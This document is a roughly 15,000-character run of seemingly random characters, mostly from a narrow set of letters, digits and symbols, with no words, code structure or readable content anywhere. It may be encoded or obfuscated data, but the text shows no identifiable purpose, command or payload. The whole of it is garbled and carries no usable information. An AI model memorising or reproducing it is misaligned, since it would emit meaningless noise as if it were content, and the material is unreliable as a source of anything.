gU{Nts%xt-hhILENt-6xt{5hEtLE%%Q%-ULh4tstA%A}Eh%UgNAE{xx-EUU{EE%Ig?A-thxLEIAI--x-NAAEx4%4ggUg6U%LNtU%hcU6I{xNhE-xE-UUg{UNItxQh-LhELUIht4-E-{AhEEIIIxgg-l{IL{tg%%X6{U{EN%N4xUyEh%{6NUxg4U-IgkLg46tg.A%tA%EUEU%Ux4hEh{th4E.IOx{gh*AIE{xg6%ggUAAEI%I4-UhgAxAgIAxEg%h6LUEgc%xNhUh-t%4USA?EhxhtAAE-4xgIga{%ItE{4xwtgU{{A{Y^4U-I6xLhA-IEfU-E64L6x6I--x-NAAEx4%4ggUg6U%LNtU%hdL{E{xNhE-xE6A6gAxLIEU-h-{6AU-4eIU-E{gA6tANh-6zt-INLLh4gIA%IgxUgt%t-4h<4LtUgtUxX-b{h6hEKNLtA66-NUxUAEAIEaxhIh-EgE{4I6g6gA%AA4U4N-%U{UUthtgx-{6g4AxtEExg_-E6NU)4KII-NhU6tttN6It9E-4NLLUth4I%E{Uh4N%tAxU6h6{UIIgIg%x%EUAUEA4I6-A-E64L6IAIEx4g6LAL-IxIN6A{xA%Ag4U46-%gNUUthE4%E%xhhULNExA4E%466UEN6%tx6--6ELUIIIxe6-A{gI6E6II%h6g{6ItE6-L%%UP{{ILI%-k%ELLUNI%tgTA-E{%{4EU4g-x-g{ALEt%46%U6gA%LN4U4-h%UUAAAE4x4t-A6-UxtIEx?h-UhI{NEgIx-E%x{hLUEIIX%ggxLIL{4gI46IUgAhAU4E4L-hg4UEtAEt%x-ghA{{NxtgmA%thxNEAx4hxLgEAtUEt%I66A{x{xtxE{%gM4UINgthtU%E%Lhh{4NExA4Eg%hgLAA{IxZEhU6EA%Eg4AWtgx{EEAE-<xWNUAAxt%tg%U%6h%{NNUxhxL%AA6{4NUt64x%464tLAx4h/UgI6NAgEx4g}{gtNtLN4U4-h%UUAAAE4x4t-A6-UxtIE+-g-UhI{NEg&%xAhU6h{xIII4<%-NNLLx4g%E6tL%hIItt64hhMgNAEA%IhxU-EUAUNAIt{66-EUxEL4L%IxNULh2L%xt4AgU-4U%AgtU%h=x{EUhNhxExE6A6NAxNAIA-4-xUIUENN%txEhULgUUxL4ga-gLNLL44-wx06L6htA6tg4{h?gIUIA4Ig%x%EhAUNNxxInhghLELEIUI%g%ggh{Lt4%4gQ{gtA%AgE{4t6%gNAUA-&%-U6A6EAxAtIAx--xUIU{IgIU*I-q{gE%EgI{*tUt{gL{Et-t%gg{{tIttg4LHI6UELAEtNgthgLgN-N{%L49-LhUUNx6IUm{ULLnELI_=Ec4UkhLLSEx4-htg{{xLOtUxU53LVUgN-%6xN6*LgE64ltLx>-xh-ttNtIhwIgEhtI6EE+x%g6Ah{Ax4I4L%%6AUUALZ!446EgxLhNUIE-A-N6IU{x6IE-xggAAEx4nIAh6gthIILth---NhI{%E4E{Ix%6h4E6AN0L4Eg%hgLU4UIUxN-&LhLNN{IxBxg%LILxE-4LgIgL{%AAtU4Lh&6{NtAhxhx{%A6-E1NIxEg6{6L{tLNPI%6t-xh4tJ4A7tgU6%NtL6Et4Ed4LL{EAN*t-66Lh%EtA6ttxE%4ALUENN%tHA%{LgENxLtG^LgUhNI6N44U}Lgx{xLL)L4E%NLtUAt{xEgt%66tUEA4%L4xghhULIAN4g1xhEhtAhEU4Inr6g{xEIt-I4%U6U{AthtU4N%<UhU{tEtxWh%-hE{xEhI{BE{thgt6Ng%L8NU%AUtLEEx%%66UNUIgEN%U%-L%NUtAtE%x%thAU-NxxI4x--6LUxNL%JxL-{6xLE4%4g+L-I{UILNxxh%U6IhNNgtx%E%thhUUNItjTg-xUIUxN-IL6L-xh6UAEg-6eUg{NLAh46%LhL-O{LAUENg6%N{xUgNAE{xx6I6hNgAUIIxxghhLLEEUYhxUgIh4th4E4EgUg%A%LgtA4N%x{E{hNhtUxId1hgUxtIt{-g%4LIEgIhIU-E-L{hU4EElAbE-ThhLxxHIU%IgxUhL-tExU6gL6UgNAttxxaNUUN!4gxIx{hg64EI4gShMUhEhLAhN44EgAgEh4A6z64E(466E6AEEr4h%xLsUgN-%6-x6XUELh4KtLxY-xh-ttNxI46<{NLNAhx;ILm#gx{-Itt-%U%Eh%h4NUEE!%--hUELAxS_4x{6h{EI4g%6sUgIh?Agxg%x<{{gh4tIxg%h%U{E{LNhE4xE6A6E{lAhtxg<%UhIUxEht-PEgULgL6EIIx%hgL{EAU4hI4gEg{NhtE4I4x6ggGUIA{Ig-%-g6{Ut4tIgxL%IhUtLAx4hvUgI6NAgEx2E6tgEU%A6tUI-gxULNEthE4%E%{LhNEtItx-g%DhIU{Eg0%_g-{htttEgI{atUt{gL{Et-tigg{htAgEtg6ftgN{gAxxhxU%t6%UE4tttxh-IhEUtx6IE-xgg{AU{ExzIOLg%{AAUEL-f/4{EhxNhtUxE6A6N{IA{%6xE6xhgEAIxYDxAU6htUIxL4h6-6NUIL%I4I{xxg6U4I6EN-LZEh%UgNUPUxU%N6&NhNUtNx>{khUUtN%IE6t-xh4t&E{HtgU{EAEILNr4L%UgNE6LEI%xg-Ag{UxNExU4Eg%hgLANtIx7E{U6EA%Eg4Axtgx{EEAEEIDHhgxNmAgt-g66tU6AtA4J54L%^6xU-4tt{xx%XhULUA7%)8gg-N6EE4Nqt:4U&hLLFEx4-htgt{hAItE4t{6h%NsAE/LxLhohUELN%dXX-{L6IE<Eh%LSh{%hgAAEEx%x46UUgExE{xA%Eh%U6NUIg-%%NUUU-4%,U-A-EUxUtEAI-wxhI6xAhEU4IxN6g{xEENxxh%U6I{9NgtxxI%xhh{LNEIU-h%4UEU{4hME-I-xLgUoEII{%g{%hgAAEEx%x46UUgExNIIU6hg4AEA{wh-E6I6xNgAzIIx{ggL%L-IUV?g%-%htLUN04gh6gNL4tExg-i%LgAE6AUt{gLh-U-AxN-%64t-6hgU{4:Ig0-U6LTNWE--6xtg6{gL{x&4g%-L6{NEx4E--hqgL{JAxt-gt%MUUUtI%IgxL%IhUtLNUmgx-hIhxL-EL-LTxg6hAAgM6x%gx6gAAAEE4x6{66E{cAhtxgZ-gh-t6Itx_.-U66tL6EgI{6Ygg{-I64tq3%-L6htA6tg4{hO6{{AA->KxU6EUrNtI;xxg6{DhLUAx6IUf{ULh4E64{-LxQgL{ULNb6IEh6gANLAxJg%I--g4UUNUtA-h-U6NUOIhI{-E{UL4E%E{I-^EgEhIEAEEI4%6{A{ELeEh4xhv6{AEIUx4-%-g6{Ut4tIgxL%IhUtLNEIN6tg-L{Eg4t-Lx9gL{ULN&6I4%UgL{xAxELgL%E6NEtN-x{-I{t66UtNEt46L-hLgLIEIIU%g{%{{L-EE4E(I{A{EL4t6%A%x{xUANAtLxx6IgxU-ALtxxL{G6LU{AxIEg%gghLUIEU-L=h{g{IAIEUxg6%6g{{Atctxg%{6tEtNgt{xt{th-NUNN%%gUU6hEU4E6-6Q-hxhNtA4x%%%g{U{6N%ENxU6h6{AEI6xh4h%y6EU6NU%Lx4h-LxEUx6ItxIULhELNxt%hg{gNNtL6Et4E94LL{EAN,t-L6L6NEtA6ttxE%4ALUENN%tP-%{LgEx4h-6xtg6{gL{xwIN%gg6{EAEE6g6%U6{ELA4E-%xh{A6{tN6Igx{{j6xNEAN&hON-{hxLxE%_Ifxg-{LEIEt%g%L{IhxA-EL4x%LLV{LA{ExxEh%hgULAIIU6L-ULgU-IIIxp-gLNLLxE6IA%gL6U%Extg%A%Eg4U646tE4Z%h6xElNgI-66hEU9NEN4%VxL-/hxL-xtIx14U}A{UN4U4Nhtg6{tAEE4gLexLL{IItIggUh%hgULAIIU6L-4LgEx4{cA^E-4{6I6EEI ihgxNVAgt-g6%N{xAEtaal4L%=6xU-4ttA-Ug%{%UEEU2hvU-th%LExt4UgU6%U%LXtU%h%UgN{+IZtU4N%aL(UUANtFgC-{UEU44h_E6L-xh-LLxLI{gg-4AItg4h4UgEgLUhL4tE%A%N{xNLtAEAx6%x6LUE4tI--{{gLEtLNaI%6t-xh4tOE{.N6-UKhLLkEx4-htgx{4I=xL%N6U6NEtA6ttxE%4ALUENNJxgU%{LgL{xLtJwLgUhNI6ENII0{L6{EExxU-gh6UhN-46tt4I{L6EUN4tq6-{-NAtU6NtIEx4UL{gEgEI4I0t6gA%A{E-4E%EgIAAAEE4x66A6%AxNAIAxg-xUIL-A4IUHU-ALhLUNNI:ghgUhtL%EE-tiA{UU%N%EExU6h6U{NA7Q9xU%t6%UE4ttxx4{^LANtN4%=xL-)hxL-xtI{,x-H{UAUNC-(%g6-E6ANN4%E6xL<{LA1txx-{th-NU4gRN-Ig-64LUEUIAghgUhNL 4hIU6<ghN6AExx%AdEg4{6AEt6gt%66-{ENUxIxx-66ALgx6tE66-AALLxxg7Iexg-{LILEx4-%LLL{xA6EAxg{66UU{4Lt4--6xLUt6AtI6yg-{AHLgE-%Ug4hCLEL4xmILp!gx{-ItE{4xcw6UUUL/ypxg--A6N4L4xEx4{?6LU1NxI-6t-ELUU{4%4{(-gE{ELI4A4EB466AAAL4xx66AgE{4A6tEx6{t66U-AEIU-I-xh6UAEg-6GLhx{6EAEEI4%6L6{ELHEh4xh#6IAEAxxhxU%N6ME=NUtNx({1h{NEN4%hgEULhxL-EL-Lv{{gh4tIxg%h%U{E{LNhE4xE6AgIAxNgIA4{-xUIL%IgtU,I-%{gL%IEtx%h-AAIt-tg%%dxg4NLA%4N-6hUgL{?Axt-gt%x64ELNAxN4xgh6AEI4g4g6g-6htLEN4-La{{g{UAIE)xg6%6g{LLItUgL7xhh{AIIJ%og6xhhNANEt4?6U6hEU2NhIx*Ug{AvA%46IU%Ig%NhtEtE-Emt66UgA{JV446E6xLhNLIE-A-E6oUhNx%vxUgIh%th4A4EgUgIA%AgE{4tht6{{-AEtE4I6A6E{4N6xAx6%IhhLgN6%tn-{L{%E%Ng4A_E6%64AUtgx%%g6A{tAxtE%U%Eh%{6NUxh446E6{EhIExIxxhg62LIN{4gg%g-LULEt%t4%U-EU%A-tU-L+xUzhxI6t{-IhgL6UUNIt</g{gLxU{Igt4gI{gLhLUIEIL%h-4{EEAEN9x%g6Ah{Ax4Ixh6ggUUIAxIhxL-EhUNhAUIIx4{hLELEIU4%g%-g{ALNExzE%h6h{UAIN}xg%x{I{{tgE4-IhgUhUUtEtLWh%4hENAAE4%2ggA6{LxEEDUxh%xLIL{4gI46IUgAhAU4E4L-hg4UEtAEEk%-ghA{{NxIEzA-E{%L6EU4g-xgg{AUtExeIi{{gh4tIxg%h%U{E{LNhE4xE6A6NAxNgIA4{-x6gLANNIxg_-UALUU4tI46h{EAtLxth4L%EUENUL44E4{hhUEAIAxxg4q-I6{LgI%I--U-E{%{4EUPhmIhE6xAhEU4IJ36g{xEINxxh%{UINgNg4xxA6AgEL%N-IU-g-IhIUxEhtLkEgULhUUNNt:OU-MNLUeN4IU%g{A{ELWEh4xhjg1{AN%tx4#{L64E6NIxI4xghhULIAN4gBxgIhxAhEL4E%U{g{UAINzxg6%gNAUA-W%-U6A6EAxAtIAx--xUIU4IgIU9I%N{gUUEII4%gU6hEttNE% %-UAAxtDtgxA%t6xNxIEt-%x%NLANxI%Ig-U-6{%UNEUShv{hEhxAhN-4EgA6%LxLgtA4E-%66UUNgx%4g-A6NE%IUIU-g-IUI{xEhI{<EhU{%A%Eg4Axtgx{EEAE-oxYNUAAxt%tg%U%6h%{NNUxh4U-I6xLhA-IEiUhg6%{EIAI--x-NAAEx4%4ggUg6U%LNtU%h9U6I{xNhE-xE-UhhUUNItyqg-xUEUxEhtL/EhAh-NxNN%Agx{%{gEUE6x%JN6UAhA{4E4x-hg-UELxIhx{-ELtUg46tggL-NA%EU4LIE%%g6{UtUxgINgUg-N%tU4A4EgxgtUAA-tx%I%4UgUUNIENpgh%hANUAE4%pggAhtLxEE=AxE6%{-tA4x4xgE6hAhLUtI44-g{xUANAtEJ%%6hULgI%Igx{-tAtLgN{It6tggh{Ltxt4g_{gtNtAgELII%ULL{EAN,tx-6{UgNLI6%64t-6hgU{4*IgC-U6hNN446/x6(-Lh=LxE--tlxg4NXA{4t%B6ALt{6AttE44{LgxLhNUII4NgghxNEAx4h7UgIh*AgEx4Ixx6h{UAINHxg%x6EAAAEEc4h%xLjUgN-%6xN64UEN(IE%tx6-thEU4xLI4l%-NNLAh4g%L6LULALtUrL4D%%Lt{xA49^x{6tUFNL4tt6xt-E64tLNLI%oAgUhLt3EU_Ewx6hh-AEEL4%%A6U{LI&E--t%{UgUEIbEx>h-UhEEtAE4%Zg{ALxLx4x%Ep%hxhNtAEE%x6UL6{6LIthxg%6Lt{NtUx3-%--6h{44tIg-U-ELiUAx6ItxIULh{EgN4%I6g{hhUAIExxggx-4UAA-tx%I%x6-ULtII-44-UhUUAIhIUxN-cLhU:NA4%bx-FNLAh4h4{RAg-NiA{4E-6h6U{ELA/t%gt%x64E&N{xt-Uh4AtU6NtIEx4ULhELNxt4-g{{gAEILNq4L%UgNE6AUt{gL%4U6NN4LEdxL-U6Nt6E%xxJggA6{LxNg4A%%gxAmUxth4I6IUgUgIgEN%U%-L%NUtAtE%x%thAU-NxxIxx-66ALgx6tE%%gg{AU{Ex4EgU-EU%AgtA4t%x6EUAAEI%46-UhgN%ANxUx-{%LUNANExxxtgAh-LxIIIxz-gLNLLxE6IA%gL6hEN%tgxAG{6xUEtU=LxU-I6*LgL4xEg6{UL%UNIUI-6%{ULALEIxIt%Ag-{xEIEx4-%LLL{xA6EAxg{66UU{4Lt4--hLAL{;NLIUxNU6hUL{xLsxgghx{-I6Nt46%gg{N3LUtI4x-hg-UENUxg4U-I6xLhNLIEXUghhULIA?4g&xhIh{EgN4%I6g{h{UEEELxhw46EAAAEE^4h%xL({UNItx(h%-hELUIgI6CI-x{hLLEE4UghgUhNL1xT4Uztg%{EItEx44h06{ANI6R24L%V6xU-4tt{xx%ihULUAb%#pgg-N6LNA4&Eg:U/hLLzEx4-htggUAAEI%I4-UhgAxAgIAxEg%h6LUEg4%ZggA6tLxEEfAV-hxhNtA4x%%%g{U{6N%ENxU6h6N{{Axtxx%6I6xU-NLxI4xghhULIAN4gCxhE6xAhEU4IKF6g{xtENxxh%U6Ih,Ngtx%I%{Ug{4IIPg-h-UUEULEht4<EhA6EU4N6IEa6Uth6L-NE4UgIgx{6LAtgg6yEh%UgNAE{xx-EUU{EE%IgmA-thxLE4UtE%%gg{AUtEx4EgAg-LxLNxA%x6%6gAUA6I%4N-UUhUUANtTgG-U6NU=4ZIUxN-&ACLUNNIH6&gNh{LxEx4%gIgx{-AL4I4x%6gAUg46t64I-hhgU64tIg-U-E{%{4EUI6xIgh{gL6xtt46Lg-LxAUxtIE-%6gUUILEUxI%xLhNENEsEgU%IUEU{4hIUgE{gA/UfNA4%8x-bNLL{4g%tgIg4{%LNBL4x6g6UNtAhvTxL%AA6U-txtNgAhxL%UgEAIE;xhE6NAhN44EgAgEh4A64A4E^466E6AEE4x6{66E{KAhtxg7-gh-t6It=E-thUhNttN6ItnE-4NLL4E%INhLg{AgtExU-L6NU{ELAet%gt%x64E_N{EN-UhtLLtLA8ILrU-NN6UEt%4g%A-{{xAE4UIE-%6gUAAttxxEhN6EL%A6IU-h-N6{UxNxI%-I-xh-LLIIILf%gA{ULLx5I4gEgxUhL-tE%A%6gIUhNgt6gt54UU{EE%tN,Uhhh{UAN-%mMUhEh{th4E%tfx6h{LAEEZ4%ht6AN{N44%4h6-gN{gAL4-gL%-Lt{xEhIUiE{EhEU4E6ZAJ4-N{gAgEh%%%gg{{tt%tg4LfI6UELLxIhxU-IgNLgNxxE4xghhULINR4gwx{4hxAhNL4EgAgEh4A6m64E0466E6AEE14h%xL=UgN-%6xN64L6E64 tLxG-xh-ttNxI46f{LAUELEN-t_6gt{EL4oL4E%NLtU-t{xg-A6OA6{tN6Igx{{Jh{UAN-%rx(hEA-E84G5x66UQ{LLA;64U%{LL{4L-4x-6h%LK{LAZtxx-{t6xU44LIUvI%N{gNYNg4A_E6%h6AUtg-gc6gt{EL4bL4{6g6UUIADIg-%-g6L{INU%Lx{hg64EI4g)h^U-NhYEhENI{^xgx{%EIEx4-%L{IhxNhtUxI<NhgUxtEEA4gh%h{U-NEIExIhAhEU4E6MAsE-bhhLxxV4g%-Ut{EN%N4xU66gUUIAxIh4L-EhUEUALt=xx--AtUNIUIE%%g6{UEhEUItb%gENtLN4U4-h%UUAAAEE4x66A6E{4N6%6xE%a6hUx4_tUKI-x{hU-EE4Ugg-U{ILxth4L%E6UNgLUtI4x-hgLUENUxhxU%N6}EWNUttx%-EAtUxN4%*gA{g6{EgE{-LxFgL{ULNQ64NkIg{E6A64x-U6EL6NUI{%6xt%IALUENN%t#-hLLtEtxLty3LgUhNI6NEx%%g6Ah{AxtE%Uwh-xAIN-E4xU-U6ANhNUtNxohhhgL-4tIE%%%4{UEgIxIg%AgEU%L6tUxghgg6{tAEE4gL%{Ug{4IIGg-h-U6tU%NE%txNhUhEA%E64UghgUhNL^4h4N={gx{xA%4I4x%-6LAIAxt64A-gA6{EE%Ig&A%{hxLEIUth4xhIhxL-EL-L.xg-{LILEx4-%LLL{xA-tLgL%x66{ANg%6xU-{ALU4I-xxg-hEAdULNVIxR-UthxL4xm%h6h{L{NItE64t%Eg4ELAEtNgth%UxN6N{%L4^-LhUUNx6IUK{ULLIENI4vET4UFhLL=Ex4-htgx{4ILEUxI%xhh{-NEIU-6%UhIUxEhtL_EgUAUULNQIxQ-UthNEUE--%6U{A{EL!Eh4xhMg4AEAxIhxL-EUAUEA4I6-A-E68UhNx%q gg-N6LNIx!EgI{ANtL6Et4E<4LL{4A%ENgLZwUgNtIt.ggw-L6At6NUI{6L{6LgNxN6-6xtg6{gL{x_IU6XgxUhL-tE-L%Eh%U6NUMU-%%NUUU-4%zU-A-EUxUtEAI-HxhIhxL6NA4gh6-EU%AgtAI{%x6EAUL4I%xg-A6tUxNExAxE%4h6t6NEt4v6U6hEU,NhIx6YgLhAI6N44US6-xh4L4!LIx-h6UUILNIgxx-g6{Ut4tIgx{-tAtLgN{It6tgghLUIEU-LJEgNNtA-4{%A6ALLh_ALtU4N{66N{IA{%6x-6xL{NI46*U-xU6htUIxLIERNUt{-EL4A%UhL-&{LAUENg6%6gIUhNgt6gt-gUUUEE%E4cU%E{%LgEU%Lxx{56xt6EU%I6gU6hItxxE44nN6gUgAhx%xg%{6tN%AtthxI-E6tt6NExx0ggA6{LxNg4AFEgxAnLUxLIU6tgxNhtExt4hhULgU{A-tExE%IUAUEA4I6-A-E6TUhNx%+xa-A{%LxNR-L9x{g{UAINNxgWU6I{xNg^64EhtgEN8Ng_A-xhs6AEE4UIUxN-rA!LUNNIa6MgUhtL%EE-t9xg4N=thxL%{6g6{ELL2tLxU%NA6UUN{%Lx4h-L{Nxx6tt>6ggh{tpE64I#x6h{LAEtU%gbU6I{xNhE-xE-UUhUUAtt%xE{t6gLANE4%44gU{gt64x)ABE-4{6I6EEIo;hgxNlAgt-g6%N{BN%I-pb4L%_6xU-4ttglA-E{%{4EU4g-x-{{ALEt%46%U6gA%AgELII%ULL{EANwt-%h%U-U{4LEvxL-U6Nt6N6tI^hggh6ttEU%LkN{}hEtLNI%b%hULU%t#EA-L%LUW{{tAt64I-hhgU64ttt-Uh<L%U%NtIUxoggN6L6I4%E6gUb{LLA^64U%{LLN%t-EWgLv;6LUUAN%6xU-{ALEgI-tH6L%+hLLUNN-6BxhxhgEAEEIK2hgxNOAgt-g66x{xAEAL/M4L%06xU-4tI--U-EL%UEIUI-g%gghLUIEU-LC%{g{{AINNxg6%6hAUANI%46-UUhUItEt7-h-U6NU94YIUxN-}A+LUNtI%JEUthxL4x?%LgN{U{6ItE64t%Eg4ELAEtNgthUULNgA0%L47-LhUUNx6INxI-{N6LEIx%UgIU6A6tU264tvILL{EANFt-6R{Ug{p4LETxL-U6Nt6N%xxwUgA6ILxIIItgggE{IA%tg%%%{g-{EAEEI%A%Eg4U6tAE4%x%AUUNgN6%LYg--hLtLN44hdIgEhhU4xt%U6AggA%A{E-4E%EgIAAAEE4x66A6E{MAhtxg %NUEUhIgxxx7U6hxU4E6-6kN6%{AAUE%INhLUgNhLx4I4x%-6LELAxt64A-gA6UUN{%L-=h66 tLABIL>U-NN6U4EUILHxgxhLILEE4NhtUgh{tgE_gL)!6LUUAN%6x66xLEE-IhINx{-xhxL%IIIxz-gLLIL{4gINgI-x{-LLEx4LhVgL{{LxtE-%-g6L{INU%LxLhgLxE{IAIEx4g6N6LEN446h6gEh4A6!646gxgtNAtxDtxg%{6tEtNgtL4I-UALULN%IA(U-LAjUQIEIx%h--{EEAE6II%h6g{6Itt6%UGh-xAIA4t%4N{L6xNgIErt6%%IAtL6Nh%VxV-A{%LxN!-Lvx{ghAAIExxg6%6-{hL4zt4N6UUZN;4htxgs-L6At6N6tIRhggh6ttEg5U>E6%hNAU4hI0PA6%{xL01LIN6g6UUIIgIg-%%t6hUINEtt66--UxLgEAF4=xhIhELNxtt4gU{ghUILtg4-%LLL{{t-4x4t{6gtU6Ngt{gf-LhIU{Egxx44gAh-LxIIIx%h{E{EEUEt%%%gg{{tt%tg4{%tU%UgA{tt-%-g6{Ut4tIgx{-tAtLgN{It6tggh{Ltxt4gYL-I{UILEE4NhtU-Ait-t{gL_ 6LUUAN%6xU-{ALU4I-xxg-{gA*ULNiIxz-UthxL4xM4{gt{UANtE_LI=%L6U{N46t64I-hhgU64tIA-A-N6IU{x6IN-x{LALEtxt46_hUQ{gA-i64Ng4{EN-I_EL4<%x6-EtAxt4gq-{UNNUII%tx6-thEU4xLIE1N{xAUEL4g4{hL-a{LAUENg6z46U{LAxtx4L{L6EUN4t#h4{hgh{tLAOILbU-NN6A%Ix4g%A-{{xLgtAx%%xU_hxNhtI-IhghgEgN{t-xE-E6INANEt4D6hA6Et6Eg4Ax{gxAtLxth4L%EUEAhL44E4{hhUEAIAxxg48-I6{LgI%tgx{%thgUtx6ttxN-ghxEhEUIt/%gENtAA4U4E-%-4UULEI%xA-ULL{UNIIhghhEhEEENEt4>6U6hEU!NhIx6=-U{ILxthI-%E6UAgLUtI4x-h6LUENUIhxU-IgVLgNxxIx{hg64EI4g?h1UhEhLAhN44EgAgEh4A6;64E;.gh{xIvtgx-hUUxAatEt4gB%L6(UxN-%tx{-x6HLUEUt16Cgg{-I6ENt4gEU6N>LLEw4x%-Lt{gNAtET%24hULgtxt{*A-E{%L6EU4gg%-NLUL-x%%UgAgELxLttA4-%x{IU-L4tUxU%AUhUUANti-h%UhIUxEht-8EgUALtgIII{gg-4AItg4h4UgEgLUhL4tE%AbEg4{6AEt6gt%66-{ENUxIxx-66ALgx6tE%%gg{AU{Ex4E6tUUA%LN4U4-h%UUAAAE4x4t-A6-UxtItxx--LALUxN-IL6L-xh-LLxLIx;6-A{gI6EU4{hLg4A-Exx--6hMgL{lAxt-gt%{6x{,NUIU4&{9hgL-x6IN44hEL4E4xtI6OtgEh4ILEL4%%A6U{LIkt{-t-hUhU{tEtx#h%-hE{xEhI{7EhU6EA%E-4U6LUghNEUE--%6U{A{EExEtxA%-6xAILxIhxU-IgNLgNxIIxxghhLLEEUfgSUgI6_Ag4%INgUg-N%tU4A4EgxgtUAA-tx%I%4UgUUNIEN2gh%hANUAE4%qggAhtLxEE=AxE6%{-tA4x4xgE6hAhLUtI44-g{xUANAtEW%%6hULgI%tN-U--A%EUIAIE-x-t{AL-ExoIxx6h{UAINNxg%x{EhALgx%4N6U6-E%IUxAxE6x6tLAN-Ix-I%x{hLUEItN%ggx{ILxth4L%E6UAgAUtII&-gU%{NtUt-g%hUUAUEtxttGA--hxNIN4(gzUgI6NAgNU4IK46gLxLgtA4N%xU&{UILEU-t%4LhNEIttx*h-LhEEE4Ut4-E-{AhEEIIIxgg-_{IL{tg%%%-{U{EN%N4xU6h6IAELxIhxU-I6TLgNxxI4xghh{EI4g4g-xgALAUEt%4-%U{g{IAIExxhGL6EUUthtN4{%x6xU%tItxx--LUIULN%IAwU-LA5L{III4gggU{IUNtgIU%Ig4UgI6EgxA%NL%NUNU<U446E6{EhIExIxxhg6?LIN{4gg%-g{ALEt%t4%U6gLxL{tA4E-%66UUNgx%4N6U6-E%IUxAxE6x6tLAN-Ix-I%x{hLUEItN%ggxLEL-th4U%IgXUgAx4I4{6gg4NIIgxhxU6E6LLhA4IE-A%E{%LgEAt{TxgELUUEt%4g%Agt{xAEtA4E-%g6UUNgx%4N6U6-E%IUxAxE6x6tLAN-Ix-I%x{hLUEItN%ggxLEL-th4U%IgBUgAx4I4{6gg4NIIgxhxU6E6LLhA4IE-A%E{%LgEAt{1xgELUUEt%4g%Agt{xAEtA4E-%g6UUNgx%4N6U6-E%IUxAxE6x6tLAN-Ix-I%x{hLUEItN%ggxLEL-th4U%Ig&UgAx4IIx%-gL{xAL2o4L%{gxUEI%IgxL%IhUtLNLI%=AgUhLt*E{%t%h{h{{EEExxh5-6EhxNht{xE6UgEL%N-IUgL{g6NNUN-%%gUhAhENxNt4A&-gxLIUxth4U%I-NUgAxtI4x-h6LUENUxgxU-Ig?LgI%tN-U--A%EUIAIE-x-t{AL-ExfIQ4{g{UAINNxg6%6AAULEI%xg-A6tUxNExA4Eg%h-EAIxIx-EghLhUUEII4%ghx{AAAEEx%/66UUgt%EN%U%-L%NUtAtE%x%thAU-NxxI4xghhULIAN4g}xhE6AUg4%INgUg-N%tU4A4EgxgtUAA-tx%I1xhhUUNIENXg-xhIUxEhILDEgULgLUEItV%g{%hNEUE--%6U{A{EExEtxA%-6xAIA4xgxU-IgNLgAUIIx4ggUxUgEAINQx{JhUtLNU%tF4UhAEttExxh%L6ENEIUE4%E%{LhNEtItx-g%XhIU{Egy%T-hUhEA%A44UghgILEUxth4U%Ig7UgAx4IIx-h6{NIIgIg%x-AUA{EE%I-.UhghILINx4hxLgE{UEhEUINC<U9{ULNE=-r%Ugt{%AEHt4x%4L:NUtxxU-g-{AL{nNLIUxNU6htUIxLI-cE-LhgL-E--t%gg{{tt%tg4L9I6UELLxIhxU-IgNLgNxxE4xghhULIN34gmx{I6xAhEU4Ix06g{xEIEx4-%LLL{xA-tLgL%x66{ANg%6xU-{ALN4INx.-E-4AMULN^IxH-UthxL4x/4{gN{UANthPLIW%L6U{N46tUx{{LU4NEt5I-66%th6LgN{%DxNggh6LEEEI6h6gU{{IL44%Ax4{E{4IHEL4P%x6-EtAgIAxEg%g4LUEgxxxggAhEA%E64U%g{IhgAAEEx%T66UUgt%t{4-%E6E{ItAtE44-6UA{EE%IgjA%{hxLEIUIh66-L{ALEt%46%U6gAsLNEE4669g{NEthEU4N#26U{=4LEa44%UhgNANEt,xh-xAfUUEIIx%h--{EAU4gIU%IgxUhALtExUh%gUUIAxIh4L-EhUNhNUtNxi{,hUUtN%IE6t-xh4t,N4IAx,UGhUAIExxh?-6EUULtt6xg%{LT{4tEt{ghhEUIUxN6tAmgU6h-NxEg4AKtgxLILxE-4LgIgx{-AL<L4x%6gAUg46tUx{{LU4NtL4xEx4{F6LUiNxI-6t-thhLIEEIth6gtACLExLIt6%6-{hL4Ytx-6UU_N=IU%6xt%IALUENN7xg6hLhNttN6ItnE-4NLL4E%INhLg-AgtEx6-L6LUgELA,t%gt%x64ECN{EN-UhxAtU6NtIEx4ULh}EgEU4IxN6gA%LA4U4th%-xNUtxx%x-%hg4EtNgxUxth56At6NttI6L-ULgLNEIIx6ggL{EEANEx%%g6UAgLx4I4x%-6LAIA{xg44hILgNhNUxExLgh64LEIAI4xNgg{gLh4%4gv{gtA%A64U4E-%-4UUthEL%ESxhhULNExAxN%I6{t6NExxv6{ALxE>NA-6lt-INLAhx-xN-Ig%L4L{Nx46-4L6{6ILEE*%-ghUEUNUtNxPhhhNU{NxIxs%hIhxL-ELjI?xg6hAAgT64tgx6gUAL{tx%I!^Ug{UNIt!/gh%h-UhA4%tSghUhtt%4U%Lp%Ut{6Lhx&4I6Nh-LhLA4{I4:UgtL{ItEt-C%ghAUENx5xxx--hLNINxI-XLULhxL-EL-L<xg6hAAgf646SI6hUgA6=t4A6UgkL%NgIAxt-xhENAN6tI3hggh6ttNE,AR6-I{hAgE6-t%-{UhhUx4I4U6g6INNExthxEvd6g{tE6x6gt%hgxEtAA4%mI-xh{LtEUtwgUgNhULNt%It%ggA{{ILE4-t%xLU{FAAI%xx%cALUxIgI{FI-x{gE%N{Ixxt-Uh{L{xV4U%IUgUgN%tgxA646xUEtAtE44-6LLL%NItNxx%AhgUNNYIEx6hEh4UEN44hxSgUhILNxtIE6#6gNLA-og4t%h6IUEAt%6xE6xh-LANEIxCggALxLxEIIx%h{N{EAU4gI4gIgx{-AL4IIUhUU%U-AhE4gt*4UUNxI!Ig>A%thxL6Nh%?x4hEh{th4E9I2Lg%{AAUEL-Y%U{E{LNhE4xE6A6UU{4Ltxrh-hhENUIgyEg{h4ABULNpIx 